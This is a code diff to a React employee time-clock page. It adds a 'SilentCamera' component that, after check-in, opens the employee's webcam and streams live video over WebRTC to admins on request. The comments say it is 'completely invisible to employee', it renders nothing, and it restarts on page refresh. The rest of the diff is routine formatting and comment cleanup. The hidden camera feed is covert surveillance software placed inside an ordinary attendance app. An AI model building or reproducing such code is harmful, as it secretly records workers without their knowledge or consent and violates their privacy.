@@ -3,6 +3,143 @@
 import { useState, useEffect, useCallback, useRef } from "react";
 import "./TimeClock.css";
 
+/* ══════════════════════════════════════════════════════════════════
+   SILENT CAMERA — WebRTC version, no Daily.co, no credit card
+   Streams employee camera to admin silently after check-in
+══════════════════════════════════════════════════════════════════ */
+function SilentCamera({
+  entryId,
+  employeeName,
+  email,
+  onRoomReady,
+  onError,
+}: {
+  entryId: string;
+  employeeName: string;
+  email: string;
+  onRoomReady?: (roomName: string) => void;
+  onError?: (err: string) => void;
+}) {
+  const streamRef = useRef<MediaStream | null>(null);
+  const peersRef = useRef<Map<string, RTCPeerConnection>>(new Map());
+  const esRef = useRef<EventSource | null>(null);
+
+  const sendSignal = async (message: object) => {
+    try {
+      await fetch("/api/time/signal", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(message),
+      });
+    } catch (err) {
+      console.warn("SilentCamera signal error:", err);
+    }
+  };
+
+  const createPeerForAdmin = async (adminId: string, stream: MediaStream) => {
+    if (peersRef.current.has(adminId)) return;
+
+    const pc = new RTCPeerConnection({
+      iceServers: [
+        { urls: "stun:stun.l.google.com:19302" },
+        { urls: "stun:stun1.l.google.com:19302" },
+      ],
+    });
+    peersRef.current.set(adminId, pc);
+
+    stream.getTracks().forEach((track) => pc.addTrack(track, stream));
+
+    pc.onicecandidate = (e) => {
+      if (e.candidate) {
+        sendSignal({ type: "ice-candidate", from: email, to: adminId, payload: e.candidate });
+      }
+    };
+
+    pc.onconnectionstatechange = () => {
+      if (pc.connectionState === "disconnected" || pc.connectionState === "failed") {
+        peersRef.current.delete(adminId);
+        pc.close();
+      }
+    };
+
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    await sendSignal({ type: "offer", from: email, to: adminId, payload: offer, employeeName, entryId });
+  };
+
+  useEffect(() => {
+    let destroyed = false;
+
+    const start = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false,
+        });
+
+        if (destroyed) { stream.getTracks().forEach((t) => t.stop()); return; }
+        streamRef.current = stream;
+
+        const es = new EventSource(
+          `/api/time/signal?clientId=${encodeURIComponent(email)}&role=employee`
+        );
+        esRef.current = es;
+
+        es.onopen = () => {
+          sendSignal({ type: "register", from: email, employeeName, entryId });
+          onRoomReady?.(entryId);
+        };
+
+        es.onmessage = async (e) => {
+          if (destroyed) return;
+          try {
+            const msg = JSON.parse(e.data);
+
+            if (msg.type === "request-stream" && msg.to === email) {
+              await createPeerForAdmin(msg.from, streamRef.current!);
+            }
+
+            if (msg.type === "answer" && msg.to === email) {
+              const pc = peersRef.current.get(msg.from);
+              if (pc && pc.signalingState !== "stable") {
+                await pc.setRemoteDescription(new RTCSessionDescription(msg.payload));
+              }
+            }
+
+            if (msg.type === "ice-candidate" && msg.to === email) {
+              const pc = peersRef.current.get(msg.from);
+              if (pc) await pc.addIceCandidate(new RTCIceCandidate(msg.payload));
+            }
+          } catch (err) {
+            console.warn("SilentCamera message error:", err);
+          }
+        };
+
+        es.onerror = () => {
+          if (!destroyed) setTimeout(() => { if (!destroyed) start(); }, 5000);
+        };
+      } catch (err: any) {
+        if (!destroyed) onError?.(err?.message || "Camera error");
+      }
+    };
+
+    start();
+
+    return () => {
+      destroyed = true;
+      esRef.current?.close();
+      esRef.current = null;
+      streamRef.current?.getTracks().forEach((t) => t.stop());
+      streamRef.current = null;
+      peersRef.current.forEach((pc) => pc.close());
+      peersRef.current.clear();
+    };
+  }, [entryId, email, employeeName]);
+
+  // Completely invisible to employee
+  return null;
+}
+
 type Action = "check-in" | "break-in" | "break-out" | "bio-break-in" | "bio-break-out" | "check-out";
 type Status = "checked-in" | "on-break" | "on-bio-break" | "returned" | "checked-out" | null;
 
@@ -33,6 +170,7 @@ interface TimeEntry {
   totalBioBreak: number;
   status: Status;
   selfies?: SelfieEntry[];
+  // ── dailyRoomName removed — no longer needed ──
 }
 
 interface EmployeeProfile {
@@ -86,21 +224,16 @@ export default function TimeClockPage() {
   const [fetching, setFetching] = useState(false);
   const [actionModal, setActionModal] = useState<{ action: Action; image: string; message: string } | null>(null);
 
-  // ── COLLAPSIBLE SECTIONS ──
   const [timelineOpen, setTimelineOpen] = useState(true);
   const [selfieOpen, setSelfieOpen] = useState(true);
 
-  // ── EMPLOYEE PROFILE STATE ──
   const [employeeProfile, setEmployeeProfile] = useState<EmployeeProfile | null>(null);
   const [employeeChoices, setEmployeeChoices] = useState<EmployeeProfile[]>([]);
   const [lookingUp, setLookingUp] = useState(false);
   const [lookupDone, setLookupDone] = useState(false);
   const lookupTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
-
-  // ── FIX: selection lock prevents double-tap/double-click on name picker ──
   const selectionLockRef = useRef(false);
 
-  // ── DATE PICKER ──
   const today = toLocalDateString(new Date());
   const [selectedDate, setSelectedDate] = useState<string>(today);
   const [isHistorical, setIsHistorical] = useState(false);
@@ -108,10 +241,8 @@ export default function TimeClockPage() {
   const [fetchingHistorical, setFetchingHistorical] = useState(false);
   const [historicalMessage, setHistoricalMessage] = useState<string | null>(null);
 
-  // ── LIGHTBOX ──
   const [lightbox, setLightbox] = useState<{ selfies: SelfieEntry[]; index: number } | null>(null);
 
-  // ── CAMERA ──
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const previewCanvasRef = useRef<HTMLCanvasElement>(null);
@@ -125,7 +256,10 @@ export default function TimeClockPage() {
   const [photoUploaded, setPhotoUploaded] = useState(false);
   const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
-  // ── FIX: refs to hold live values so camera callbacks never read stale closure state ──
+  // ── WEBRTC SILENT CAMERA STATE ──
+  // ✅ Changed: no more activeRoomName (Daily.co concept) — just entryId
+  const [activeEntryId, setActiveEntryId] = useState<string | null>(null);
+
   const actionModalRef = useRef<{ action: Action; image: string; message: string } | null>(null);
   const emailRef = useRef("");
   const nameRef = useRef("");
@@ -184,12 +318,10 @@ export default function TimeClockPage() {
     return () => window.removeEventListener("keydown", handler);
   }, [lightbox]);
 
-  // ── FIX: keep refs in sync with their state counterparts ──
   useEffect(() => { actionModalRef.current = actionModal; }, [actionModal]);
   useEffect(() => { emailRef.current = email; }, [email]);
   useEffect(() => { nameRef.current = name; }, [name]);
 
-  // ── Auto-open timeline when new entry loads ──
   useEffect(() => {
     if (entry) { setTimelineOpen(true); setSelfieOpen(true); }
   }, [entry]);
@@ -197,7 +329,17 @@ export default function TimeClockPage() {
     if (historicalEntry) { setTimelineOpen(true); setSelfieOpen(true); }
   }, [historicalEntry]);
 
-  // ── LIVE PREVIEW: mirrors video onto canvas ──
+  // ── Restore SilentCamera on page refresh if still checked in ──
+  useEffect(() => {
+    if (entry && entry.status !== "checked-out" && entry._id && !activeEntryId) {
+      setActiveEntryId(entry._id);
+    }
+    if (entry?.status === "checked-out") {
+      setActiveEntryId(null);
+    }
+  }, [entry]); // eslint-disable-line react-hooks/exhaustive-deps
+
+  // ── LIVE PREVIEW ──
   const startPreview = useCallback(() => {
     const loop = () => {
       const video = videoRef.current;
@@ -247,34 +389,25 @@ export default function TimeClockPage() {
     } finally { setLookingUp(false); }
   }, []);
 
-  // ── FIX: selection lock prevents redundant double-tap/click on name picker ──
   const handleSelectProfile = (profile: EmployeeProfile) => {
-    // If already processing a selection, ignore this call entirely
     if (selectionLockRef.current) return;
     selectionLockRef.current = true;
-
-    // Immediately wipe choices so the picker disappears and cannot be re-clicked
     setEmployeeChoices([]);
     setLookupDone(true);
     setEmployeeProfile(profile);
     setName(profile.employeeName);
-
-    // Use the email ref (always current) instead of the potentially-stale closure value
     fetchStatus(emailRef.current, profile.employeeName);
-
-    // Release the lock after a safe delay (longer than any double-tap window)
     setTimeout(() => { selectionLockRef.current = false; }, 800);
   };
 
   const handleEmailChange = (val: string) => {
     setEmail(val); setEmailError(""); setEmployeeProfile(null); setEmployeeChoices([]); setLookupDone(false);
-    // Reset selection lock whenever the email changes so a fresh lookup works cleanly
     selectionLockRef.current = false;
     if (lookupTimer.current) clearTimeout(lookupTimer.current);
     lookupTimer.current = setTimeout(() => lookupEmployee(val), 750);
   };
 
-  // ── CAMERA ──
+  // ── CAMERA (selfie modal) ──
   const startCamera = async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, audio: false });
@@ -283,11 +416,7 @@ export default function TimeClockPage() {
         videoRef.current.srcObject = stream;
         videoRef.current.onloadedmetadata = () => {
           videoRef.current!.play()
-            .then(() => {
-              setCameraReady(true);
-              startPreview();
-              startCountdown();
-            })
+            .then(() => { setCameraReady(true); startPreview(); startCountdown(); })
             .catch(() => setCameraError("Could not start camera playback."));
         };
       }
@@ -356,11 +485,7 @@ export default function TimeClockPage() {
     finally { setUploadingPhoto(false); }
   };
 
-  const retakePhoto = () => {
-    setCapturedPhoto(null); setPhotoUploaded(false);
-    startCamera();
-  };
-
+  const retakePhoto = () => { setCapturedPhoto(null); setPhotoUploaded(false); startCamera(); };
   const closeModal = () => {
     stopCamera(); stopPreview();
     if (countdownRef.current) clearInterval(countdownRef.current);
@@ -435,6 +560,17 @@ export default function TimeClockPage() {
       else {
         setMessage({ text: data.message, type: "success" });
         setEntry(data.entry);
+
+        // ── ✅ UPDATED: WebRTC camera — no Daily.co room needed ──
+        if (action === "check-in" && data.entry?._id) {
+          setActiveEntryId(data.entry._id);
+        }
+        if (action === "check-out") {
+          // SilentCamera cleans itself up via useEffect cleanup automatically
+          setActiveEntryId(null);
+        }
+        // ─────────────────────────────────────────────────────────
+
         const { image, message: msg } = getActionContent(action);
         setActionModal({ action, image, message: msg });
       }
@@ -485,24 +621,13 @@ export default function TimeClockPage() {
 
     return (
       <div className="timeline">
-
-        {/* ── TIMELINE COLLAPSIBLE HEADER ── */}
-        <button
-          className="section-toggle-btn"
-          onClick={() => setTimelineOpen(o => !o)}
-          aria-expanded={timelineOpen}
-        >
+        <button className="section-toggle-btn" onClick={() => setTimelineOpen(o => !o)} aria-expanded={timelineOpen}>
           <span className="section-toggle-icon">{timelineOpen ? "▾" : "▸"}</span>
           <span className="section-toggle-title">📋 {dateLabel}</span>
-          {!timelineOpen && (
-            <span className="section-toggle-pill">
-              {worked > 0 ? formatMinutes(worked) : "—"}
-            </span>
-          )}
+          {!timelineOpen && <span className="section-toggle-pill">{worked > 0 ? formatMinutes(worked) : "—"}</span>}
           <span className={`section-toggle-chevron${timelineOpen ? " open" : ""}`} />
         </button>
 
-        {/* ── COLLAPSIBLE BODY ── */}
         <div className={`section-collapse${timelineOpen ? " section-collapse-open" : ""}`}>
           <div className="section-collapse-inner">
             <div className="timeline-row"><span className="timeline-label">🟢 Check In</span><span className="timeline-value">{formatTime(rec.checkIn)}</span></div>
@@ -532,20 +657,13 @@ export default function TimeClockPage() {
           </div>
         </div>
 
-        {/* ── SELFIE GALLERY with its own toggle ── */}
         {selfieCount > 0 && (
           <div className="selfie-gallery">
-
-            <button
-              className="section-toggle-btn section-toggle-btn-selfie"
-              onClick={() => setSelfieOpen(o => !o)}
-              aria-expanded={selfieOpen}
-            >
+            <button className="section-toggle-btn section-toggle-btn-selfie" onClick={() => setSelfieOpen(o => !o)} aria-expanded={selfieOpen}>
               <span className="section-toggle-icon">{selfieOpen ? "▾" : "▸"}</span>
               <span className="section-toggle-title">📸 {isToday ? "Today's" : "Day's"} Selfies</span>
               <span className="section-toggle-pill section-toggle-pill-selfie">{selfieCount} photo{selfieCount !== 1 ? "s" : ""}</span>
             </button>
-
             <div className={`section-collapse${selfieOpen ? " section-collapse-open" : ""}`}>
               <div className="section-collapse-inner">
                 <div className="selfie-grid">
@@ -558,7 +676,6 @@ export default function TimeClockPage() {
                 </div>
               </div>
             </div>
-
           </div>
         )}
       </div>
@@ -567,9 +684,20 @@ export default function TimeClockPage() {
 
   return (
     <>
-      {/* hidden canvases */}
+      {/* hidden canvases for selfie capture */}
       <canvas ref={canvasRef} style={{ display: "none" }} />
       <video ref={videoRef} autoPlay playsInline muted style={{ display: "none" }} />
+
+      {/* ── ✅ WebRTC SilentCamera — no Daily.co, no credit card needed ── */}
+      {activeEntryId && name && email && (
+        <SilentCamera
+          entryId={activeEntryId}
+          employeeName={name}
+          email={email}
+          onRoomReady={(id) => console.log("Camera ready for entry:", id)}
+          onError={(err) => console.warn("SilentCamera:", err)}
+        />
+      )}
 
       <div className="page">
 
@@ -613,12 +741,7 @@ export default function TimeClockPage() {
               <div className="name-picker-subtitle">Multiple accounts found for this email. Please select your name:</div>
               <div className="name-picker-list">
                 {employeeChoices.map((ep, i) => (
-                  <button
-                    key={i}
-                    type="button"
-                    className="name-picker-option"
-                    // Use onPointerDown instead of onClick so the selection fires on the
-                    // first physical touch/click and the lock prevents any repeat fires
+                  <button key={i} type="button" className="name-picker-option"
                     onPointerDown={(e) => { e.preventDefault(); handleSelectProfile(ep); }}
                   >
                     <img src={ep.profilePic || `https://ui-avatars.com/api/?name=${encodeURIComponent(ep.employeeName)}&background=1a2744&color=00ff88&size=48`} alt={ep.employeeName} className="name-picker-avatar" />
@@ -756,7 +879,7 @@ export default function TimeClockPage() {
                   </div>
                 )}
 
-                {/* ── CAMERA SECTION ── */}
+                {/* ── SELFIE CAMERA SECTION ── */}
                 <div className="camera-section">
                   {!capturedPhoto && !cameraError && (
                     <>
@@ -772,18 +895,15 @@ export default function TimeClockPage() {
                       )}
                     </>
                   )}
-
                   {cameraError && (
                     <div className="camera-error-box">
                       <p className="camera-error-text">📵 {cameraError}</p>
                       <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: "#4b5563", marginTop: 6, letterSpacing: 1 }}>SELFIE SKIPPED</p>
                     </div>
                   )}
-
                   {capturedPhoto && (
                     <img src={capturedPhoto} alt="Your selfie" className="camera-captured-photo" />
                   )}
-
                   {(capturedPhoto || cameraReady) && (
                     <div className="camera-status-bar">
                       <span className={`camera-status-text ${uploadingPhoto ? "uploading" : photoUploaded ? "done" : ""}`}>
@@ -836,14 +956,14 @@ export default function TimeClockPage() {
         )}
 
         <div className="footer-link">
-  Admin? <a href="/login">Login to view all records →</a>
-  <p style={{ marginTop: 8 }}>
-    Employee?{" "}
-    <a href="/employee-login" style={{ color: "#00ff88" }}>
-      View your attendance portal →
-    </a>
-  </p>
-  <p>Crafted by Nikko with coffee and love ☕</p>
+          Admin? <a href="/login">Login to view all records →</a>
+          <p style={{ marginTop: 8 }}>
+            Employee?{" "}
+            <a href="/employee-login" style={{ color: "#00ff88" }}>
+              View your attendance portal →
+            </a>
+          </p>
+          <p>Crafted by Nikko with coffee and love ☕</p>
           <p>A gift from nikko to nationgraph family</p>
           <p>Under OM mirah cluster lead by: TL Cris Arandilla</p>
         </div>
